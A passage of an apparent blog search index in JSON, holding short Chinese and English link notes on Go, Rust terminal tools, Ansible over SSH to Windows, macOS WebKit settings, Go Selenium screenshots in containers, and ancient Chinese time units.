the allowed EOF behaviors.\u003c/p\u003e\u003c/blockquote\u003e\n\u003cp\u003e所以程序必须先处理 n \u0026gt; 0 的情况，然后再处理 err != nil 的情况！这跟我之前的印象不相符。因为一般来说，当 err 非空时，前面的返回数据一般都是空值。但 io.Reader 并不是这样。\u003c/p\u003e","tags":["URL","Go"],"title":"使用Go语言解析二进制数据踩坑总结"},{"categories":["URL","Rust","Terminal"],"contents":" Rust Easy! Modern Cross-platform Command Line Tools to Supercharge Your Terminal Alacritty Alacritty is a cross-platform modern terminal emulator with sensible defaults. It is GPU accelerated, super fast, and highly configurable. You can use it on Linux, macOS, and Windows.\nbat bat is one of my favorite tools from this list. It\u0026rsquo;s a replacement for cat.\ndust Dust is an alternative for the du command. It is fast and has a better UX with nice visualization for disk usage.\nripgrep ripgrep (rg) is a line-oriented search tool that recursively searches your current directory for a regex pattern. It is faster than grep and has many features like compressed files search, colorized output, smart case, file type filtering, multi-threading, and so on.\nTopgrade Topgrade is a fantastic utility if you prefer to keep your system up-to-date.\n","date":"January 13, 2023","hero":"/images/default-hero.jpg","permalink":"https://linzeyan.github.io/posts/2023/20230113-rust-terminal-tools-linux-mac-windows-fish-zsh/","summary":"\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://deepu.tech/rust-terminal-tools-linux-mac-windows-fish-zsh/\" target=\"_blank\" rel=\"noopener\"\u003eRust Easy! Modern Cross-platform Command Line Tools to Supercharge Your Terminal\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch4 id=\"alacritty\"\u003e\u003ca href=\"https://github.com/alacritty/alacritty\" target=\"_blank\" rel=\"noopener\"\u003eAlacritty\u003c/a\u003e\u003c/h4\u003e\n\u003cp\u003eAlacritty is a cross-platform modern terminal emulator with sensible defaults. It is GPU accelerated, super fast, and highly configurable. You can use it on Linux, macOS, and Windows.\u003c/p\u003e\n\u003ch4 id=\"bat\"\u003e\u003ca href=\"https://github.com/sharkdp/bat\" target=\"_blank\" rel=\"noopener\"\u003ebat\u003c/a\u003e\u003c/h4\u003e\n\u003cp\u003ebat is one of my favorite tools from this list. It\u0026rsquo;s a replacement for cat.\u003c/p\u003e\n\u003ch4 id=\"dust\"\u003e\u003ca href=\"https://github.com/bootandy/dust\" target=\"_blank\" rel=\"noopener\"\u003edust\u003c/a\u003e\u003c/h4\u003e\n\u003cp\u003eDust is an alternative for the du command. It is fast and has a better UX with nice visualization for disk usage.\u003c/p\u003e","tags":["URL","Rust","Terminal"],"title":"Rust Easy! Modern Cross-platform Command Line Tools to Supercharge Your Terminal"},{"categories":["URL","Ansible","Windows","SSH"],"contents":" Windows SSH setup Install OpenSSH for Windows 預設的 shell 是使用 cmd，照文件說，若需要修改，是要改 ansible_shell_type 變數，這應該是要在 inventory 主機裡加入主機變數：ansible_shell_type，變數內容可以是 cmd 或 powershell。 inventory 主機裡要加入 ansible_connection 主機變數，告知要使用 ssh 連線。(192.168.192.11 ansible_user=Administrator ansible_connection=ssh ansible_shell_type=cmd ) 可能會需要在 ansible.cfg 裡加上 remote_tmp 設定，指定為 C:\\TEMP Playbook 裡可以使用 win_ 開頭的模組，或是使用 raw 模組 ","date":"January 3, 2023","hero":"/images/default-hero.jpg","permalink":"https://linzeyan.github.io/posts/2023/20230103-windows-ssh-setup/","summary":"\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://ansible.cloudns.pro/post/windows-ssh-setup/\" target=\"_blank\" rel=\"noopener\"\u003eWindows SSH setup\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://learn.microsoft.com/en-us/windows-server/administration/openssh/openssh_install_firstuse\" target=\"_blank\" rel=\"noopener\"\u003eInstall OpenSSH for Windows\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003col\u003e\n\u003cli\u003e預設的 shell 是使用 cmd，照文件說，若需要修改，是要改 ansible_shell_type 變數，這應該是要在 inventory 主機裡加入主機變數：ansible_shell_type，變數內容可以是 cmd 或 powershell。\u003c/li\u003e\n\u003cli\u003einventory 主機裡要加入 ansible_connection 主機變數，告知要使用 ssh 連線。(\u003ccode\u003e192.168.192.11 ansible_user=Administrator ansible_connection=ssh ansible_shell_type=cmd \u003c/code\u003e)\u003c/li\u003e\n\u003cli\u003e可能會需要在 ansible.cfg 裡加上 remote_tmp 設定，指定為 C:\\TEMP\u003c/li\u003e\n\u003cli\u003ePlaybook 裡可以使用 win_ 開頭的模組，或是使用 raw 模組\u003c/li\u003e\n\u003c/ol\u003e","tags":["URL","Ansible","Windows","SSH"],"title":"Windows SSH setup"},{"categories":["URL","Terraform"],"contents":" Terraform Provider 開發紀錄 ","date":"December 28, 2022","hero":"/images/default-hero.jpg","permalink":"https://linzeyan.github.io/posts/20221228-terraform-provider-development/","summary":"\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://hazel.style/2022/12/06/Terraform-Provider-Development/\" target=\"_blank\" rel=\"noopener\"\u003eTerraform Provider 開發紀錄\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e","tags":["URL","Terraform"],"title":"Terraform Provider 開發紀錄"},{"categories":["URL","macOS"],"contents":" Inspecting Web Views in macOS defaults write NSGlobalDomain WebKitDeveloperExtras -bool true defaults write -g WebKitDeveloperExtras -bool YES ","date":"December 2, 2022","hero":"/images/default-hero.jpg","permalink":"https://linzeyan.github.io/posts/20221202-inspecting-web-views-in-macos/","summary":"\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://blog.jim-nielsen.com/2022/inspecting-web-views-in-macos/\" target=\"_blank\" rel=\"noopener\"\u003eInspecting Web Views in macOS\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003edefaults write NSGlobalDomain WebKitDeveloperExtras -bool true\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003edefaults write -g WebKitDeveloperExtras -bool YES\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e","tags":["URL","macOS"],"title":"Inspecting Web Views in macOS"},{"categories":["URL","Go","Selenium"],"contents":" Go 使用 selenium 截图 package main import ( \u0026#34;fmt\u0026#34; log \u0026#34;github.com/sirupsen/logrus\u0026#34; \u0026#34;github.com/tebeka/selenium\u0026#34; \u0026#34;io/ioutil\u0026#34; ) const ( chromeDriverPath = \u0026#34;/usr/local/bin/chromedriver\u0026#34; port = 9515 ) func main() { var opts []selenium.ServiceOption selenium.SetDebug(false) service, err := selenium.NewChromeDriverService(chromeDriverPath, port, opts...) if err != nil { panic(err) // panic is used only as an example and is not otherwise recommended. } defer service.Stop() caps := selenium.Capabilities{\u0026#34;browserName\u0026#34;: \u0026#34;chrome\u0026#34;} // 整页截屏 // 获取到网页的宽高，然后把浏览器的窗口设置成这么大，然后再截图就好了！需要注意的是只有 headless 模式可以任意设置窗口大小，否则最大高度不能超过你的显示器分辨率 // chromeCaps := chrome.Capabilities{ // Path: \u0026#34;\u0026#34;, // Args: []string{ // \u0026#34;--headless\u0026#34;, // }, // } // caps.AddChrome(chromeCaps) wd, err := selenium.NewRemote(caps, fmt.Sprintf(\u0026#34;http://localhost:%d/wd/hub\u0026#34;, port)) if err != nil { panic(err) } defer wd.Quit() // 在 selenium 中使用ExecuteScript就可以执行 JavaScript 代码，需要注意返回值是 interface，所以要类型断言成 float，然后再转成 int // height, _ := wd.ExecuteScript(\u0026#34;return document.body.parentNode.scrollHeight\u0026#34;, nil) // var realHeight = int(height.(float64)) // 然后我们需要设置窗口大小 // wd.ResizeWindow(\u0026#34;\u0026#34;, 1920, realHeight) if err := wd.Get(\u0026#34;https://github.com/tgbot-collection/archiver\u0026#34;); err != nil { panic(err) } screenshot, err := wd.Screenshot() if err != nil { log.Errorln(err) } ioutil.WriteFile(\u0026#34;screenshot.png\u0026#34;, screenshot, 0644) } 整页截屏 获取到网页的宽高，然后把浏览器的窗口设置成这么大，然后再截图就好了！需要注意的是只有 headless 模式可以任意设置窗口大小，否则最大高度不能超过你的显示器分辨率\n在容器中运行 直接运行 apk add chromium-chromedriver 浏览器和 webdriver 会一起安装好\n要注意一件事情，如果你是 root 用户运行的，那么要加上--no-sandbox 参数\nChrome 和 container 的兼容性问题，Chrome 需要比较大的/dev/shm，然而容器中的/dev/shm 往往都比较小，\n通过 run 时额外参数--shm-size=256m 也可以直接把宿主机的共享进去docker run --rm -v /dev/shm:/dev/shm -it alpine sh 也可以禁用 Chrome 的 shm 功能，加一个参数 \u0026quot;--disable-dev-shm-usage\u0026quot;, 中文乱码 alpine 里没带中文字体，所以中文会乱码。可以用 alpine 自带的一个，这样安装就好，也可以自己偷字体，然后放到/usr/share/fonts/就好了\napk add wqy-zenhei --update-cache --repository https://nl.alpinelinux.org/alpine/edge/testing\n","date":"December 2, 2022","hero":"/images/default-hero.jpg","permalink":"https://linzeyan.github.io/posts/20221202-go-selenium/","summary":"\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://dmesg.app/go-selenium.html\" target=\"_blank\" rel=\"noopener\"\u003eGo 使用 selenium 截图\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-go\" data-lang=\"go\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003epackage\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003emain\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003eimport\u003c/span\u003e (\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;fmt\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#a6e22e\"\u003elog\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;github.com/sirupsen/logrus\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;github.com/tebeka/selenium\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;io/ioutil\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003econst\u003c/span\u003e (\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#a6e22e\"\u003echromeDriverPath\u003c/span\u003e = \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;/usr/local/bin/chromedriver\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#a6e22e\"\u003eport\u003c/span\u003e = \u003cspan style=\"color:#ae81ff\"\u003e9515\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003efunc\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003emain\u003c/span\u003e() {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#66d9ef\"\u003evar\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eopts\u003c/span\u003e []\u003cspan style=\"color:#a6e22e\"\u003eselenium\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eServiceOption\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#a6e22e\"\u003eselenium\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eSetDebug\u003c/span\u003e(\u003cspan style=\"color:#66d9ef\"\u003efalse\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#a6e22e\"\u003eservice\u003c/span\u003e, \u003cspan style=\"color:#a6e22e\"\u003eerr\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e:=\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eselenium\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eNewChromeDriverService\u003c/span\u003e(\u003cspan style=\"color:#a6e22e\"\u003echromeDriverPath\u003c/span\u003e, \u003cspan style=\"color:#a6e22e\"\u003eport\u003c/span\u003e, \u003cspan style=\"color:#a6e22e\"\u003eopts\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e...\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#66d9ef\"\u003eif\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eerr\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e!=\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003enil\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\tpanic(\u003cspan style=\"color:#a6e22e\"\u003eerr\u003c/span\u003e) \u003cspan style=\"color:#75715e\"\u003e// panic is used only as an example and is not otherwise recommended.\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t}\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#66d9ef\"\u003edefer\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eservice\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eStop\u003c/span\u003e()\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#a6e22e\"\u003ecaps\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e:=\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eselenium\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eCapabilities\u003c/span\u003e{\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;browserName\u0026#34;\u003c/span\u003e: \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;chrome\u0026#34;\u003c/span\u003e}\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#75715e\"\u003e// 整页截屏\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#75715e\"\u003e// 获取到网页的宽高，然后把浏览器的窗口设置成这么大，然后再截图就好了！需要注意的是只有 headless 模式可以任意设置窗口大小，否则最大高度不能超过你的显示器分辨率\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#75715e\"\u003e// chromeCaps := chrome.Capabilities{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#75715e\"\u003e// \tPath: \u0026#34;\u0026#34;,\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#75715e\"\u003e// \tArgs: []string{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#75715e\"\u003e// \t\t\u0026#34;--headless\u0026#34;,\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#75715e\"\u003e// \t},\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#75715e\"\u003e// }\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#75715e\"\u003e// caps.AddChrome(chromeCaps)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#a6e22e\"\u003ewd\u003c/span\u003e, \u003cspan style=\"color:#a6e22e\"\u003eerr\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e:=\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eselenium\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eNewRemote\u003c/span\u003e(\u003cspan style=\"color:#a6e22e\"\u003ecaps\u003c/span\u003e, \u003cspan style=\"color:#a6e22e\"\u003efmt\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eSprintf\u003c/span\u003e(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;http://localhost:%d/wd/hub\u0026#34;\u003c/span\u003e, \u003cspan style=\"color:#a6e22e\"\u003eport\u003c/span\u003e))\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#66d9ef\"\u003eif\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eerr\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e!=\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003enil\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\tpanic(\u003cspan style=\"color:#a6e22e\"\u003eerr\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t}\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#66d9ef\"\u003edefer\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003ewd\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eQuit\u003c/span\u003e()\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#75715e\"\u003e// 在 selenium 中使用ExecuteScript就可以执行 JavaScript 代码，需要注意返回值是 interface，所以要类型断言成 float，然后再转成 int\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#75715e\"\u003e// height, _ := wd.ExecuteScript(\u0026#34;return document.body.parentNode.scrollHeight\u0026#34;, nil)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#75715e\"\u003e// var realHeight = int(height.(float64))\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#75715e\"\u003e// 然后我们需要设置窗口大小\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#75715e\"\u003e// wd.ResizeWindow(\u0026#34;\u0026#34;, 1920, realHeight)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#66d9ef\"\u003eif\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eerr\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e:=\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003ewd\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eGet\u003c/span\u003e(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;https://github.com/tgbot-collection/archiver\u0026#34;\u003c/span\u003e); \u003cspan style=\"color:#a6e22e\"\u003eerr\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e!=\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003enil\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\tpanic(\u003cspan style=\"color:#a6e22e\"\u003eerr\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t}\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#a6e22e\"\u003escreenshot\u003c/span\u003e, \u003cspan style=\"color:#a6e22e\"\u003eerr\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e:=\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003ewd\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eScreenshot\u003c/span\u003e()\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#66d9ef\"\u003eif\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eerr\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e!=\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003enil\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\u003cspan style=\"color:#a6e22e\"\u003elog\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eErrorln\u003c/span\u003e(\u003cspan style=\"color:#a6e22e\"\u003eerr\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t}\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#a6e22e\"\u003eioutil\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eWriteFile\u003c/span\u003e(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;screenshot.png\u0026#34;\u003c/span\u003e, \u003cspan style=\"color:#a6e22e\"\u003escreenshot\u003c/span\u003e, \u003cspan style=\"color:#ae81ff\"\u003e0644\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e}\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch5 id=\"整页截屏\"\u003e整页截屏\u003c/h5\u003e\n\u003cp\u003e获取到网页的宽高，然后把浏览器的窗口设置成这么大，然后再截图就好了！需要注意的是只有 headless 模式可以任意设置窗口大小，否则最大高度不能超过你的显示器分辨率\u003c/p\u003e","tags":["URL","Go","Selenium"],"title":"Go 使用 selenium 截图"},{"categories":["URL","Time"],"contents":" 古代計時單位 十二時辰時間對照表 時辰 古名 對應現代時間 初 / 正時間 別名（完整） 子時 夜半 23:00-01:00 子初 23:00\n子正 00:00 子夜、中夜、午夜、夜分、夜半、未旦、宵分、未央 丑時 雞鳴 01:00-03:00 丑初 01:00\n丑正 02:00 荒雞 寅時 平旦 03:00-05:00 寅初 03:00\n寅正 04:00 平明、旦明、黎明、早旦、日旦、昧旦、騎旦、早晨、早夜、早朝、昧爽、旦日、旦時 卯時 日出 05:00-07:00 卯初 05:00\n卯正 06:00 日上、日生、日升、日始、日晞、旭日、破曉 辰時 食時 07:00-09:00 辰初 07:00\n辰正 08:00 早食、宴食、蚤食 巳時 隅中 09:00-11:00 巳初 09:00\n巳正 10:00 日隅、禺中、日禺 午時 日中 11:00-13:00 午初 11:00\n午正 12:00 日正、日午、日高、正午、中午、亭午、日當午、平午、平晝 未時 日昳 13:00-15:00 未初 13:00\n未正 14:00 日昃、日仄、日側、日跌、日斜、日映、日央 申時 晡時 15:00-17:00 申初 15:00\n申正 16:00 餔時、日餔、日晡、日鋪、日稷、日夕、夕食 酉時 日入 17:00-19:00 酉初 17:00\n酉正 18:00 日沒、日沉、日西、日落、日逝、日晏、日旴、日晦、傍晚 戌時 黃昏 19:00-21:00 戌初 19:00\n戌正 20:00 日夕、日末、日暮、日晚、日闇、日墮、日暗、日曛、曛黃 亥時 人定 21:00-23:00 亥初 21:00\n亥正 22:00 定昏、夤夜 更 漢代皇宮中值班人員分五個班次，按時更換，叫「五更」，由此古人把便把一夜分為五更，每更為一個時辰。 戌時為一更，亥時為二更，子時為三更，丑時為四更，寅時為五更\n更名 時辰 時間 一更天 戌時 19：00－21：00 二更天 亥時 21：00－23：00 三更天 子時 23：00－01：00 四更天 丑時 01：00－03：00 五更天 寅時 03：00－05：00 點 古代使用銅壺滴漏計時，以下漏擊點為名。每更分為五點，故每點合為現在的 24 分鐘。\n","date":"November 29, 2022","hero":"/images/default-hero.jpg","permalink":"https://linzeyan.github.io/posts/20221129-ancient-time-unit/","summary":"\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://wywu.pixnet.net/blog/posts/1022354528\" target=\"_blank\" rel=\"noopener\"\u003e古代計時單位\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch5 id=\"十二時辰時間對照表\"\u003e十二時辰時間對照表\u003c/h5\u003e\n\u003ctable\u003e\n  \u003cthead\u003e\n      \u003ctr\u003e\n          \u003cth\u003e時辰\u003c/th\u003e\n          \u003cth\u003e古名\u003c/th\u003e\n          \u003cth\u003e對應現代時間\u003c/th\u003e\n          \u003cth\u003e初 / 正時間\u003c/th\u003e\n          \u003cth\u003e別名（完整）\u003c/th\u003e\n      \u003c/tr\u003e\n  \u003c/thead\u003e\n  \u003ctbody\u003e\n      \u003ctr\u003e\n          \u003ctd\u003e子時\u003c/td\u003e\n          \u003ctd\u003e夜半\u003c/td\u003e\n          \u003ctd\u003e23:00-01:00\u003c/td\u003e\n          \u003ctd\u003e子初 23:00\u003cbr\u003e子正 00:00\u003c/td\u003e\n          \u003ctd\u003e子夜、中夜、午夜、夜分、夜半、未旦、宵分、未央\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003e丑時\u003c/td\u003e\n          \u003ctd\u003e雞鳴\u003c/td\u003e\n          \u003ctd\u003e01:00-03:00\u003c/td\u003e\n          \u003ctd\u003e丑初 01:00\u003cbr\u003e丑正 02:00\u003c/td\u003e\n          \u003ctd\u003e荒雞\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003e寅時\u003c/td\u003e\n          \u003ctd\u003e平旦\u003c/td\u003e\n          \u003ctd\u003e03:00-05:00\u003c/td\u003e\n          \u003ctd\u003e寅初 03:00\u003cbr\u003e寅正 04:00\u003c/td\u003e\n          \u003ctd\u003e平明、旦明、黎明、早旦、日旦、昧旦、騎旦、早晨、早夜、早朝、昧爽、旦日、旦時\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003e卯時\u003c/td\u003e\n          \u003ctd\u003e日出\u003c/td\u003e\n          \u003ctd\u003e05:00-07:00\u003c/td\u003e\n          \u003ctd\u003e卯初 05:00\u003cbr\u003e卯正 06:00\u003c/td\u003e\n          \u003ctd\u003e日上、日生、日升、日始、日晞、旭日、破曉\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003e辰時\u003c/td\u003e\n          \u003ctd\u003e食時\u003c/td\u003e\n          \u003ctd\u003e07:00-09:00\u003c/td\u003e\n          \u003ctd\u003e辰初 